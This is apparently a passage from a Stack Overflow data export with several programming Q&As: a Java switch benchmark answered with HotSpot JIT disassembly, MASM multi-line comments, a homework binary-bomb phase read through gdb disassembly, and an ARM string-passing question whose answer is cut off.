<p>On a lark, I tried adding even more <code>case</code>s which just returned dummy values, and found that  I could get the switch to run even faster with around 22-27 declared <code>case</code>s (even though those dummy cases are never actually hit while the code is running). (Again, <code>case</code>s were added in a contiguous fashion by incrementing the prior <code>case</code> constant by <code>1</code>.) These execution time differences are not very significant: for a random <code>exponent</code> between <code>0</code> and <code>10</code>, the dummy padded <code>switch</code> statement finishes 10 million executions in 1.49 secs versus 1.54 secs for the unpadded version, for a grand total savings of 5ns per execution. So, not the kind of thing that makes obsessing over padding out a <code>switch</code> statement worth the effort from an optimization standpoint. But I still just find it curious and counter-intuitive that a <code>switch</code> doesn't become slower (or perhaps at best maintain constant <em>O(1)</em> time) to execute as more <code>case</code>s are added to it.  </p>

<p><img src=""https://i.stack.imgur.com/kbnan.png"" alt=""switch benchmarking results""></p>

<p>These are the results I obtained from running with various limits on the randomly-generated <code>exponent</code> values. I didn't include the results all the way down to <code>1</code> for the <code>exponent</code> limit, but the general shape of the curve remains the same, with a ridge around the 12-17 case mark, and a valley between 18-28. All tests were run in JUnitBenchmarks using shared containers for the random values to ensure identical testing inputs. I also ran the tests both in order from longest <code>switch</code> statement to shortest, and vice-versa, to try and eliminate the possibility of ordering-related test problems.  I've put my testing code up on a github repo if anyone wants to try to reproduce these results.</p>

<p>So, what's going on here? Some vagaries of my architecture or micro-benchmark construction? Or is the Java <code>switch</code> really a little faster to execute in the <code>18</code> to <code>28</code> <code>case</code> range than it is from <code>11</code> up to <code>17</code>?</p>

<p><a href=""https://github.com/abissell/switch-experiment"" rel=""noreferrer"">github test repo ""switch-experiment""</a></p>

<p><strong>UPDATE:</strong> I cleaned up the benchmarking library quite a bit and added a text file in /results with some output across a wider range of possible <code>exponent</code> values. I also added an option in the testing code not to throw an <code>Exception</code> from <code>default</code>, but this doesn't appear to affect the results.</p>

<p><strong>UPDATE 2:</strong> Found some pretty good discussion of this issue from back in 2009 on the xkcd forum here: <a href=""http://forums.xkcd.com/viewtopic.php?f=11&amp;t=33524"" rel=""noreferrer"">http://forums.xkcd.com/viewtopic.php?f=11&amp;t=33524</a>. The OP's discussion of using <code>Array.binarySearch()</code> gave me the idea for a simple array-based implementation of the exponentiation pattern above. There's no need for the binary search since I know what the entries in the <code>array</code> are. It appears to run about 3 times faster than using <code>switch</code>, obviously at the expense of some of the control flow that <code>switch</code> affords. That code has been added to the github repo also.</p>
","<p>As pointed out <a href=""https://stackoverflow.com/a/15621857/632951"">by the other answer</a>, because the case values are contiguous (as opposed to sparse), the generated bytecode for your various tests uses a switch table (bytecode instruction <code>tableswitch</code>).</p>

<p>However, once the JIT starts its job and compiles the bytecode into assembly, the <code>tableswitch</code> instruction does not always result in an array of pointers: sometimes the switch table is transformed into what looks like a <code>lookupswitch</code> (similar to an <code>if</code>/<code>else if</code> structure).</p>

<p>Decompiling the assembly generated by the JIT (hotspot JDK 1.7) shows that it uses a succession of if/else if when there are 17 cases or less, an array of pointers when there are more than 18 (more efficient).</p>

<p>The reason why this magic number of 18 is used seems to come down to the default value of the <a href=""http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/357d4e2eb4dd/src/share/vm/opto/c2_globals.hpp"" rel=""nofollow noreferrer""><code>MinJumpTableSize</code></a> JVM flag (around line 352 in the code).</p>

<p>I have raised the issue on the hotspot compiler list and <a href=""http://mail.openjdk.java.net/pipermail/hotspot-compiler-dev/2013-March/009998.html"" rel=""nofollow noreferrer"">it seems to be a legacy of past testing</a>. Note that this default value <a href=""http://hg.openjdk.java.net/jdk8/jdk8/hotspot/rev/34bd5e86aadb"" rel=""nofollow noreferrer"">has been removed in JDK 8</a> after <a href=""http://mail.openjdk.java.net/pipermail/hotspot-compiler-dev/2013-May/010670.html"" rel=""nofollow noreferrer"">more benchmarking was performed</a>.</p>

<p>Finally, when the method becomes too long (> 25 cases in my tests), it is in not inlined any longer with the default JVM settings - that is the likeliest cause for the drop in performance at that point.</p>

<hr>

<p>With 5 cases, the decompiled code looks like this (notice the cmp/je/jg/jmp instructions, the assembly for if/goto):</p>

<pre><code>[Verified Entry Point]
  # {method} 'multiplyByPowerOfTen' '(DI)D' in 'javaapplication4/Test1'
  # parm0:    xmm0:xmm0   = double
  # parm1:    rdx       = int
  #           [sp+0x20]  (sp of caller)
  0x00000000024f0160: mov    DWORD PTR [rsp-0x6000],eax
                                                ;   {no_reloc}
  0x00000000024f0167: push   rbp
  0x00000000024f0168: sub    rsp,0x10           ;*synchronization entry
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@-1 (line 56)
  0x00000000024f016c: cmp    edx,0x3
  0x00000000024f016f: je     0x00000000024f01c3
  0x00000000024f0171: cmp    edx,0x3
  0x00000000024f0174: jg     0x00000000024f01a5
  0x00000000024f0176: cmp    edx,0x1
  0x00000000024f0179: je     0x00000000024f019b
  0x00000000024f017b: cmp    edx,0x1
  0x00000000024f017e: jg     0x00000000024f0191
  0x00000000024f0180: test   edx,edx
  0x00000000024f0182: je     0x00000000024f01cb
  0x00000000024f0184: mov    ebp,edx
  0x00000000024f0186: mov    edx,0x17
  0x00000000024f018b: call   0x00000000024c90a0  ; OopMap{off=48}
                                                ;*new  ; - javaapplication4.Test1::multiplyByPowerOfTen@72 (line 83)
                                                ;   {runtime_call}
  0x00000000024f0190: int3                      ;*new  ; - javaapplication4.Test1::multiplyByPowerOfTen@72 (line 83)
  0x00000000024f0191: mulsd  xmm0,QWORD PTR [rip+0xffffffffffffffa7]        # 0x00000000024f0140
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@52 (line 62)
                                                ;   {section_word}
  0x00000000024f0199: jmp    0x00000000024f01cb
  0x00000000024f019b: mulsd  xmm0,QWORD PTR [rip+0xffffffffffffff8d]        # 0x00000000024f0130
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@46 (line 60)
                                                ;   {section_word}
  0x00000000024f01a3: jmp    0x00000000024f01cb
  0x00000000024f01a5: cmp    edx,0x5
  0x00000000024f01a8: je     0x00000000024f01b9
  0x00000000024f01aa: cmp    edx,0x5
  0x00000000024f01ad: jg     0x00000000024f0184  ;*tableswitch
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@1 (line 56)
  0x00000000024f01af: mulsd  xmm0,QWORD PTR [rip+0xffffffffffffff81]        # 0x00000000024f0138
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@64 (line 66)
                                                ;   {section_word}
  0x00000000024f01b7: jmp    0x00000000024f01cb
  0x00000000024f01b9: mulsd  xmm0,QWORD PTR [rip+0xffffffffffffff67]        # 0x00000000024f0128
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@70 (line 68)
                                                ;   {section_word}
  0x00000000024f01c1: jmp    0x00000000024f01cb
  0x00000000024f01c3: mulsd  xmm0,QWORD PTR [rip+0xffffffffffffff55]        # 0x00000000024f0120
                                                ;*tableswitch
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@1 (line 56)
                                                ;   {section_word}
  0x00000000024f01cb: add    rsp,0x10
  0x00000000024f01cf: pop    rbp
  0x00000000024f01d0: test   DWORD PTR [rip+0xfffffffffdf3fe2a],eax        # 0x0000000000430000
                                                ;   {poll_return}
  0x00000000024f01d6: ret    
</code></pre>

<p>With 18 cases, the assembly looks like this (notice the array of pointers which is used and suppresses the need for all the comparisons: <code>jmp    QWORD PTR [r8+r10*1]</code> jumps directly to the right multiplication) - that is the likely reason for the performance improvement:</p>

<pre><code>[Verified Entry Point]
  # {method} 'multiplyByPowerOfTen' '(DI)D' in 'javaapplication4/Test1'
  # parm0:    xmm0:xmm0   = double
  # parm1:    rdx       = int
  #           [sp+0x20]  (sp of caller)
  0x000000000287fe20: mov    DWORD PTR [rsp-0x6000],eax
                                                ;   {no_reloc}
  0x000000000287fe27: push   rbp
  0x000000000287fe28: sub    rsp,0x10           ;*synchronization entry
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@-1 (line 56)
  0x000000000287fe2c: cmp    edx,0x13
  0x000000000287fe2f: jae    0x000000000287fe46
  0x000000000287fe31: movsxd r10,edx
  0x000000000287fe34: shl    r10,0x3
  0x000000000287fe38: movabs r8,0x287fd70       ;   {section_word}
  0x000000000287fe42: jmp    QWORD PTR [r8+r10*1]  ;*tableswitch
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@1 (line 56)
  0x000000000287fe46: mov    ebp,edx
  0x000000000287fe48: mov    edx,0x31
  0x000000000287fe4d: xchg   ax,ax
  0x000000000287fe4f: call   0x00000000028590a0  ; OopMap{off=52}
                                                ;*new  ; - javaapplication4.Test1::multiplyByPowerOfTen@202 (line 96)
                                                ;   {runtime_call}
  0x000000000287fe54: int3                      ;*new  ; - javaapplication4.Test1::multiplyByPowerOfTen@202 (line 96)
  0x000000000287fe55: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe8b]        # 0x000000000287fce8
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@194 (line 92)
                                                ;   {section_word}
  0x000000000287fe5d: jmp    0x000000000287ff16
  0x000000000287fe62: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe86]        # 0x000000000287fcf0
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@188 (line 90)
                                                ;   {section_word}
  0x000000000287fe6a: jmp    0x000000000287ff16
  0x000000000287fe6f: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe81]        # 0x000000000287fcf8
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@182 (line 88)
                                                ;   {section_word}
  0x000000000287fe77: jmp    0x000000000287ff16
  0x000000000287fe7c: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe7c]        # 0x000000000287fd00
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@176 (line 86)
                                                ;   {section_word}
  0x000000000287fe84: jmp    0x000000000287ff16
  0x000000000287fe89: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe77]        # 0x000000000287fd08
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@170 (line 84)
                                                ;   {section_word}
  0x000000000287fe91: jmp    0x000000000287ff16
  0x000000000287fe96: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe72]        # 0x000000000287fd10
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@164 (line 82)
                                                ;   {section_word}
  0x000000000287fe9e: jmp    0x000000000287ff16
  0x000000000287fea0: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe70]        # 0x000000000287fd18
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@158 (line 80)
                                                ;   {section_word}
  0x000000000287fea8: jmp    0x000000000287ff16
  0x000000000287feaa: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe6e]        # 0x000000000287fd20
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@152 (line 78)
                                                ;   {section_word}
  0x000000000287feb2: jmp    0x000000000287ff16
  0x000000000287feb4: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe24]        # 0x000000000287fce0
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@146 (line 76)
                                                ;   {section_word}
  0x000000000287febc: jmp    0x000000000287ff16
  0x000000000287febe: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe6a]        # 0x000000000287fd30
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@140 (line 74)
                                                ;   {section_word}
  0x000000000287fec6: jmp    0x000000000287ff16
  0x000000000287fec8: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe68]        # 0x000000000287fd38
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@134 (line 72)
                                                ;   {section_word}
  0x000000000287fed0: jmp    0x000000000287ff16
  0x000000000287fed2: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe66]        # 0x000000000287fd40
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@128 (line 70)
                                                ;   {section_word}
  0x000000000287feda: jmp    0x000000000287ff16
  0x000000000287fedc: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe64]        # 0x000000000287fd48
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@122 (line 68)
                                                ;   {section_word}
  0x000000000287fee4: jmp    0x000000000287ff16
  0x000000000287fee6: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe62]        # 0x000000000287fd50
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@116 (line 66)
                                                ;   {section_word}
  0x000000000287feee: jmp    0x000000000287ff16
  0x000000000287fef0: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe60]        # 0x000000000287fd58
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@110 (line 64)
                                                ;   {section_word}
  0x000000000287fef8: jmp    0x000000000287ff16
  0x000000000287fefa: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe5e]        # 0x000000000287fd60
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@104 (line 62)
                                                ;   {section_word}
  0x000000000287ff02: jmp    0x000000000287ff16
  0x000000000287ff04: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe5c]        # 0x000000000287fd68
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@98 (line 60)
                                                ;   {section_word}
  0x000000000287ff0c: jmp    0x000000000287ff16
  0x000000000287ff0e: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe12]        # 0x000000000287fd28
                                                ;*tableswitch
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@1 (line 56)
                                                ;   {section_word}
  0x000000000287ff16: add    rsp,0x10
  0x000000000287ff1a: pop    rbp
  0x000000000287ff1b: test   DWORD PTR [rip+0xfffffffffd9b00df],eax        # 0x0000000000230000
                                                ;   {poll_return}
  0x000000000287ff21: ret    
</code></pre>

<p>And finally the assembly with 30 cases (below) looks similar to 18 cases, except for the additional <code>movapd xmm0,xmm1</code> that appears towards the middle of the code, <a href=""https://stackoverflow.com/q/15621083/632951#comment-22166408"">as spotted by @cHao</a> - however the likeliest reason for the drop in performance is that the method is too long to be inlined with the default JVM settings:</p>

<pre><code>[Verified Entry Point]
  # {method} 'multiplyByPowerOfTen' '(DI)D' in 'javaapplication4/Test1'
  # parm0:    xmm0:xmm0   = double
  # parm1:    rdx       = int
  #           [sp+0x20]  (sp of caller)
  0x0000000002524560: mov    DWORD PTR [rsp-0x6000],eax
                                                ;   {no_reloc}
  0x0000000002524567: push   rbp
  0x0000000002524568: sub    rsp,0x10           ;*synchronization entry
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@-1 (line 56)
  0x000000000252456c: movapd xmm1,xmm0
  0x0000000002524570: cmp    edx,0x1f
  0x0000000002524573: jae    0x0000000002524592  ;*tableswitch
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@1 (line 56)
  0x0000000002524575: movsxd r10,edx
  0x0000000002524578: shl    r10,0x3
  0x000000000252457c: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe3c]        # 0x00000000025243c0
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@364 (line 118)
                                                ;   {section_word}
  0x0000000002524584: movabs r8,0x2524450       ;   {section_word}
  0x000000000252458e: jmp    QWORD PTR [r8+r10*1]  ;*tableswitch
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@1 (line 56)
  0x0000000002524592: mov    ebp,edx
  0x0000000002524594: mov    edx,0x31
  0x0000000002524599: xchg   ax,ax
  0x000000000252459b: call   0x00000000024f90a0  ; OopMap{off=64}
                                                ;*new  ; - javaapplication4.Test1::multiplyByPowerOfTen@370 (line 120)
                                                ;   {runtime_call}
  0x00000000025245a0: int3                      ;*new  ; - javaapplication4.Test1::multiplyByPowerOfTen@370 (line 120)
  0x00000000025245a1: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe27]        # 0x00000000025243d0
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@358 (line 116)
                                                ;   {section_word}
  0x00000000025245a9: jmp    0x0000000002524744
  0x00000000025245ae: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe22]        # 0x00000000025243d8
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@348 (line 114)
                                                ;   {section_word}
  0x00000000025245b6: jmp    0x0000000002524744
  0x00000000025245bb: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe1d]        # 0x00000000025243e0
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@338 (line 112)
                                                ;   {section_word}
  0x00000000025245c3: jmp    0x0000000002524744
  0x00000000025245c8: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe18]        # 0x00000000025243e8
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@328 (line 110)
                                                ;   {section_word}
  0x00000000025245d0: jmp    0x0000000002524744
  0x00000000025245d5: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe13]        # 0x00000000025243f0
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@318 (line 108)
                                                ;   {section_word}
  0x00000000025245dd: jmp    0x0000000002524744
  0x00000000025245e2: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe0e]        # 0x00000000025243f8
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@308 (line 106)
                                                ;   {section_word}
  0x00000000025245ea: jmp    0x0000000002524744
  0x00000000025245ef: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe09]        # 0x0000000002524400
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@298 (line 104)
                                                ;   {section_word}
  0x00000000025245f7: jmp    0x0000000002524744
  0x00000000025245fc: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe04]        # 0x0000000002524408
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@288 (line 102)
                                                ;   {section_word}
  0x0000000002524604: jmp    0x0000000002524744
  0x0000000002524609: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffdff]        # 0x0000000002524410
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@278 (line 100)
                                                ;   {section_word}
  0x0000000002524611: jmp    0x0000000002524744
  0x0000000002524616: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffdfa]        # 0x0000000002524418
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@268 (line 98)
                                                ;   {section_word}
  0x000000000252461e: jmp    0x0000000002524744
  0x0000000002524623: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffd9d]        # 0x00000000025243c8
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@258 (line 96)
                                                ;   {section_word}
  0x000000000252462b: jmp    0x0000000002524744
  0x0000000002524630: movapd xmm0,xmm1
  0x0000000002524634: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffe0c]        # 0x0000000002524448
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@242 (line 92)
                                                ;   {section_word}
  0x000000000252463c: jmp    0x0000000002524744
  0x0000000002524641: movapd xmm0,xmm1
  0x0000000002524645: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffddb]        # 0x0000000002524428
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@236 (line 90)
                                                ;   {section_word}
  0x000000000252464d: jmp    0x0000000002524744
  0x0000000002524652: movapd xmm0,xmm1
  0x0000000002524656: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffdd2]        # 0x0000000002524430
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@230 (line 88)
                                                ;   {section_word}
  0x000000000252465e: jmp    0x0000000002524744
  0x0000000002524663: movapd xmm0,xmm1
  0x0000000002524667: mulsd  xmm0,QWORD PTR [rip+0xfffffffffffffdc9]        # 0x0000000002524438
                                                ;*dmul
                                                ; - javaapplication4.Test1::multiplyByPowerOfTen@224 (line 86)
                                                ;   {section_word}

[etc.]

  0x0000000002524744: add    rsp,0x10
  0x0000000002524748: pop    rbp
  0x0000000002524749: test   DWORD PTR [rip+0xfffffffffde1b8b1],eax        # 0x0000000000340000
                                                ;   {poll_return}
  0x000000000252474f: ret    
</code></pre>
","15621602"
"Multiple line comments in assembly","11453","","<p>Is there a way to comment multiple lines in assembly?</p>

<p>I am using Masm32 v9.</p>

<p>Thanks.</p>
","<p>you can use the <a href=""http://msdn.microsoft.com/en-us/library/4c9h3x38%28VS.80%29.aspx"" rel=""noreferrer"">COMMENT</a> directive to do multi line comments:</p>

<pre><code> COMMENT @
 This is some text
 And some more text
 @
</code></pre>

<p>make sure to chose a delimiter which is not used in the comment itself ;^) </p>
","2096415"
"Binary Bomb Phase 3 Assembly","11442","","<p>Yes, this is homework, and no I'm not asking you to do my homework. I need help with phase 3 of this binary bomb. I didn't have any trouble with phases 1 and 2 but phase 3 is just too much for me. I understand that there should be 3 inputs. I'm pretty sure one of them is a character input and two of them are integers, but I'm not sure in what order.
Firstly, here is the disassembled code:</p>

<pre><code>0x0000000000401163 &lt;phase_3+0&gt;: sub    $0x18,%rsp
0x0000000000401167 &lt;phase_3+4&gt;: lea    0xf(%rsp),%rcx
0x000000000040116c &lt;phase_3+9&gt;: lea    0x14(%rsp),%rdx
0x0000000000401171 &lt;phase_3+14&gt;:        lea    0x10(%rsp),%r8
0x0000000000401176 &lt;phase_3+19&gt;:        mov    $0x402650,%esi
0x000000000040117b &lt;phase_3+24&gt;:        mov    $0x0,%eax
0x0000000000401180 &lt;phase_3+29&gt;:        callq  0x400b80 &lt;sscanf@plt&gt;
0x0000000000401185 &lt;phase_3+34&gt;:        cmp    $0x2,%eax
0x0000000000401188 &lt;phase_3+37&gt;:        jg     0x40118f &lt;phase_3+44&gt;
0x000000000040118a &lt;phase_3+39&gt;:        callq  0x4014b1 &lt;explode_bomb&gt;
0x000000000040118f &lt;phase_3+44&gt;:        cmpl   $0x7,0x14(%rsp)
0x0000000000401194 &lt;phase_3+49&gt;:        ja     0x401294 &lt;phase_3+305&gt;
0x000000000040119a &lt;phase_3+55&gt;:        mov    0x14(%rsp),%eax
0x000000000040119e &lt;phase_3+59&gt;:        xchg   %ax,%ax
0x00000000004011a0 &lt;phase_3+61&gt;:        jmpq   *0x402660(,%rax,8)
0x00000000004011a7 &lt;phase_3+68&gt;:        cmpl   $0x2c4,0x10(%rsp)
0x00000000004011af &lt;phase_3+76&gt;:        nop
0x00000000004011b0 &lt;phase_3+77&gt;:        je     0x4012a2 &lt;phase_3+319&gt;
0x00000000004011b6 &lt;phase_3+83&gt;:        callq  0x4014b1 &lt;explode_bomb&gt;
0x00000000004011bb &lt;phase_3+88&gt;:        mov    $0x7a,%eax
0x00000000004011c0 &lt;phase_3+93&gt;:        jmpq   0x4012a7 &lt;phase_3+324&gt;
0x00000000004011c5 &lt;phase_3+98&gt;:        mov    $0x6a,%eax
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
0x00000000004011ca &lt;phase_3+103&gt;:       cmpl   $0x327,0x10(%rsp)
0x00000000004011d2 &lt;phase_3+111&gt;:       je     0x4012a7 &lt;phase_3+324&gt;
0x00000000004011d8 &lt;phase_3+117&gt;:       callq  0x4014b1 &lt;explode_bomb&gt;
0x00000000004011dd &lt;phase_3+122&gt;:       mov    $0x6a,%eax
0x00000000004011e2 &lt;phase_3+127&gt;:       jmpq   0x4012a7 &lt;phase_3+324&gt;
0x00000000004011e7 &lt;phase_3+132&gt;:       mov    $0x66,%eax
0x00000000004011ec &lt;phase_3+137&gt;:       cmpl   $0x136,0x10(%rsp)
0x00000000004011f4 &lt;phase_3+145&gt;:       je     0x4012a7 &lt;phase_3+324&gt;
0x00000000004011fa &lt;phase_3+151&gt;:       callq  0x4014b1 &lt;explode_bomb&gt;
0x00000000004011ff &lt;phase_3+156&gt;:       mov    $0x66,%eax
0x0000000000401204 &lt;phase_3+161&gt;:       jmpq   0x4012a7 &lt;phase_3+324&gt;
0x0000000000401209 &lt;phase_3+166&gt;:       mov    $0x75,%eax
0x000000000040120e &lt;phase_3+171&gt;:       cmpl   $0x252,0x10(%rsp)
0x0000000000401216 &lt;phase_3+179&gt;:       je     0x4012a7 &lt;phase_3+324&gt;
0x000000000040121c &lt;phase_3+185&gt;:       callq  0x4014b1 &lt;explode_bomb&gt;
0x0000000000401221 &lt;phase_3+190&gt;:       mov    $0x75,%eax
0x0000000000401226 &lt;phase_3+195&gt;:       jmpq   0x4012a7 &lt;phase_3+324&gt;
0x000000000040122b &lt;phase_3+200&gt;:       mov    $0x70,%eax
0x0000000000401230 &lt;phase_3+205&gt;:       cmpl   $0x240,0x10(%rsp)
0x0000000000401238 &lt;phase_3+213&gt;:       je     0x4012a7 &lt;phase_3+324&gt;
0x000000000040123a &lt;phase_3+215&gt;:       callq  0x4014b1 &lt;explode_bomb&gt;
0x000000000040123f &lt;phase_3+220&gt;:       mov    $0x70,%eax
0x0000000000401244 &lt;phase_3+225&gt;:       jmp    0x4012a7 &lt;phase_3+324&gt;
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
0x0000000000401246 &lt;phase_3+227&gt;:       cmpl   $0x269,0x10(%rsp)
0x000000000040124e &lt;phase_3+235&gt;:       xchg   %ax,%ax
0x0000000000401250 &lt;phase_3+237&gt;:       je     0x4012a2 &lt;phase_3+319&gt;
0x0000000000401252 &lt;phase_3+239&gt;:       callq  0x4014b1 &lt;explode_bomb&gt;
0x0000000000401257 &lt;phase_3+244&gt;:       mov    $0x7a,%eax
0x000000000040125c &lt;phase_3+249&gt;:       jmp    0x4012a7 &lt;phase_3+324&gt;
0x000000000040125e &lt;phase_3+251&gt;:       mov    $0x6b,%eax
0x0000000000401263 &lt;phase_3+256&gt;:       cmpl   $0x201,0x10(%rsp)
0x000000000040126b &lt;phase_3+264&gt;:       je     0x4012a7 &lt;phase_3+324&gt;
0x000000000040126d &lt;phase_3+266&gt;:       callq  0x4014b1 &lt;explode_bomb&gt;
0x0000000000401272 &lt;phase_3+271&gt;:       mov    $0x6b,%eax
0x0000000000401277 &lt;phase_3+276&gt;:       jmp    0x4012a7 &lt;phase_3+324&gt;
0x0000000000401279 &lt;phase_3+278&gt;:       mov    $0x74,%eax
0x000000000040127e &lt;phase_3+283&gt;:       cmpl   $0x358,0x10(%rsp)
0x0000000000401286 &lt;phase_3+291&gt;:       je     0x4012a7 &lt;phase_3+324&gt;
0x0000000000401288 &lt;phase_3+293&gt;:       callq  0x4014b1 &lt;explode_bomb&gt;
0x000000000040128d &lt;phase_3+298&gt;:       mov    $0x74,%eax
0x0000000000401292 &lt;phase_3+303&gt;:       jmp    0x4012a7 &lt;phase_3+324&gt;
0x0000000000401294 &lt;phase_3+305&gt;:       callq  0x4014b1 &lt;explode_bomb&gt;
0x0000000000401299 &lt;phase_3+310&gt;:       mov    $0x75,%eax
0x000000000040129e &lt;phase_3+315&gt;:       xchg   %ax,%ax
0x00000000004012a0 &lt;phase_3+317&gt;:       jmp    0x4012a7 &lt;phase_3+324&gt;
0x00000000004012a2 &lt;phase_3+319&gt;:       mov    $0x7a,%eax
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
0x00000000004012a7 &lt;phase_3+324&gt;:       cmp    0xf(%rsp),%al
0x00000000004012ab &lt;phase_3+328&gt;:       je     0x4012b2 &lt;phase_3+335&gt;
0x00000000004012ad &lt;phase_3+330&gt;:       callq  0x4014b1 &lt;explode_bomb&gt;
0x00000000004012b2 &lt;phase_3+335&gt;:       add    $0x18,%rsp
0x00000000004012b6 &lt;phase_3+339&gt;:       retq
</code></pre>

<p>I inputted something like 4 112 z, just to try it out and run through the steps. </p>

<p>The code runs up to <code>0x0000000000401230 &lt;phase_3+205&gt;:       cmpl   $0x240,0x10(%rsp)</code></p>

<p>What I'm really confused about is what 0x10(%rsp) indicates. I looked at the decimal value stored in rsp and it's in the negatives. 
It seems like the first input of 4 worked out fine, and the code kept running, but I'm wondering why it's comparing rsp to 576, and what the 0x10 in front of it indicates.
Any sort of insight would be helpful.</p>
","<p>It isn't comparing <code>%rsp</code> to <code>0x240</code>. Rather, it is comparing whatever is stored at the memory location <code>%rsp + 0x10</code> to <code>0x240</code>, in other words, it's comparing a constant to what you'd call a ""local variable"" in most languages.</p>
","18961715"
"How to work with Strings in ARM?","11419","","<p>This is a homework question. Frankly, I'm not sure how a C program delivers a string parameter to the assembly level.</p>

<p>I have the function</p>

<p><code>StringSearchInString( text, searchString);</code></p>

<p>and the parameters</p>

<p><code>text = ""Hallo Alles klar""</code></p>

<p><code>searchString = ""ll""</code></p>

<p>I know ARM delivers the parameters into register R0, R1 respectively for text, searchString, but I'm not sure how this works with charactesr. If each character is 8 bits in length, then the register is mercilessly slaughtered by the incoming string.</p>

<p>I have since read that the ARM APCS converts the arguments as words, of which the first 4 bytes are stored in the register and the rest are loaded in reverse order on the stack.</p>

<p>Sooo... what? I'm not understanding this. The string <code>text</code> would be stored in R0, the first four bytes, ""Hall"" are stored in R0, and the rest in reverse order on the stack? Am I understanding that right? How do I call them? </p>

<p>TL;DR:  How do I pass a string argument from a C-Program into assembly and how do I work/load/do stuff with it? </p>

<p><strong>ANSWER:</strong></p>

<p>In the remote case that anybody is looking for a solution to this as well, here it is:</p>

